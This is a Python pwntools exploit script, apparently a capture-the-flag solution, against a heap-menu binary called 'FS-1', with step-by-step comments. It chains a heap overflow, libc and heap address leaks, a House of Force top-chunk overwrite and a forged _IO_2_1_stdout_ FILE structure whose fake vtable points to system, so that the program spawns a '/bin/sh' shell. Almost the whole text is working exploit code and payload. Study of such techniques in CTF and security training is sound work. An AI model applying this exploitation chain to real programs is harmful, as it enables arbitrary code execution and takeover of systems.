from pwn import *

p = process("./FS-1")
elf = ELF("FS-1")
libc = elf.libc


def create(idx, size, content):
	p.sendlineafter("[4] - Show the order.\n", "1")
	p.recvline()
	p.sendline(str(idx))
	p.recvline()
	p.sendline(str(size))
	p.recvline()
	p.send(content)

def edit(idx, size, content):
	p.sendlineafter("[4] - Show the order.\n", "2")
	p.recvline()
	p.sendline(str(idx))
	p.recvline()
	p.sendline(str(size))
	p.recvline()
	p.send(content)

def delete(idx):
	p.sendlineafter("[4] - Show the order.\n", "3")
	p.recvline()
	p.sendline(str(idx))

def show(idx):
	p.sendlineafter("[4] - Show the order.\n", "4")
	p.recvline()
	p.sendline(str(idx))

p.sendlineafter("name: ", "lol")


create(0, 0x60, "A")
create(1, 0x60, "BBB")
create(2, 0x60, "CCC")
create(3, 0x60, "DDDD")
'''
Create 4 chunks, since it can take upmost 4 chunks in total, we create following chunks:-

heap_chunks[0] ----> 0x71
heap_chunks[1] ----> 0x71
heap_chunks[2] ----> 0x71
heap_chunks[3] ----> 0x71
'''


payload = p64(0x0)*13
payload += p64(0xe1)
edit(0, 0x70, payload)

'''
Because of the heap overflow in the edit function, we overwrite the size of the heap_chunks[1] from the 0x71 to the 0xe1 
and free'ng that chunk would land it to the unsorted bin.
'''
delete(1)

create(1, 0x60, "XXX")
'''
Creating a chunk of the same size, since it will overlap into the chunk 2, checking the 
contents of the heap_chunks[2], we can leak the address of the main_arena and then
we can get the address of libc
'''
show(2)
libc.address = u64(p.recv(7).strip().ljust(8, b"\x00")) - 0x3c4b78
log.info("libc.addr:  0x%x" %(libc.address))

delete(0)
delete(2)

'''
Now, we will free the heap_chunks[2] and the heap_chunks[0] since both of them belong to the
fastbin list, then editing the heap_chunk[1] to the 0x10 more than it's actual size, we will
get the fd of the heap_chunks[2]
'''

edit(1, 0x70, "A"*0x70)

show(1)
p.recv(0x70)
heap_addr = u64(p.recvline().strip(b"\n").ljust(8, b"\x00"))
log.info("libc.addr:  0x%x" %(heap_addr))
'''
To carry out the rest of the attack, first fix the heap_chunks[2]
'''
edit(1, 0x70, p64(0)*13 + p64(0x71))

delete(1)
dest = libc.address + 0x3c5600       # _IO_2_1_stdout__
ptr_top = heap_addr + 0x1c0          # top_chunk
heap_fake_vtable = heap_addr + 0x70  # location for the forged vtable
system = libc.sym['system']

create(0,0x60,p64(system)*12)        # Spray the system address


'''
Now, since heap_chunks[3] is ust before the top_chunk, we overwrite the top_chunk size
to the considerably large size, implying the House of Force
'''
edit(3,0x70,p64(0x0)*13+p64(0xffffffffffffffff))   

'''
Now, since House of Force has been implied, now we will request for the chunk for the _IO_2_1_stdout_

target_address = dest_pointer - top_chunk - 0x20
'''
create(1,dest-ptr_top-32,"B")
create(2, 0x80, "x")
'''
We will first pivot the top_chunk to the 0x16 before the address of the
_IO_2_1_stdout_ and then we could just request for the chunk size of
0x80 and end up writing the forged FILE structure there and point the
vtable pointer of the _IO_2_1_stdout_ struct to the address of the system
stored on the heap
'''
payload = p64(0x0)*3
payload += p64(libc.address + 0x3c36e0)
payload += b"/bin/sh\x00"
payload += p64(libc.address + 0x3c56a3)*7
payload += p64(libc.address + 0x3c56a4)
payload += p64(0x0)*4
payload += p64(libc.address + 0x3c48e0)
payload += p64(0x1)
payload += p64(0xffffffffffffffff)
payload += p64(0x000000000a000000)
payload += p64(libc.address + 0x3c6780)
payload += p64(0xffffffffffffffff)
payload += p64(0x0)
payload += p64(libc.address + 0x3c47a0)
payload += p64(0x0)*3
payload += p64(0xffffffff)
payload += p64(0x0)*2
payload += p64(heap_fake_vtable)
'''
Because of this, we already overwrote the heap_fake_vtable address to the
vtable member of the _IO_2_1_stdout_ and then we will
just place the forged FILE structure:-

gef➤  p _IO_2_1_stdout_ 
$4 = {
  file = {
    _flags = 0x6e69622f, 
    _IO_read_ptr = 0x7f495f7b16a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_read_end = 0x7f495f7b16a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_read_base = 0x7f495f7b16a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_base = 0x7f495f7b16a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_ptr = 0x7f495f7b16a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_end = 0x7f495f7b16a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_buf_base = 0x7f495f7b16a3 <_IO_2_1_stdout_+131> "\n", 
    _IO_buf_end = 0x7f495f7b16a4 <_IO_2_1_stdout_+132> "", 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x7f495f7b08e0 <_IO_2_1_stdin_>, 
    _fileno = 0x1, 
    _flags2 = 0x0, 
    _old_offset = 0xffffffffffffffff, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = "\n", 
    _lock = 0x7f495f7b2780 <_IO_stdfile_1_lock>, 
    _offset = 0xffffffffffffffff, 
    _codecvt = 0x0, 
    _wide_data = 0x7f495f7b07a0 <_IO_wide_data_1>, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0xffffffff, 
    _unused2 = '\000' <repeats 19 times>
  }, 
  vtable = 0x56177b803090

'''
edit(2,0x140,payload)

'''
During the clean up, it will when flushing the streams, the vtable will be triggered and ended up being
in the execution of the system("/bin/sh\x00")
'''
p.interactive()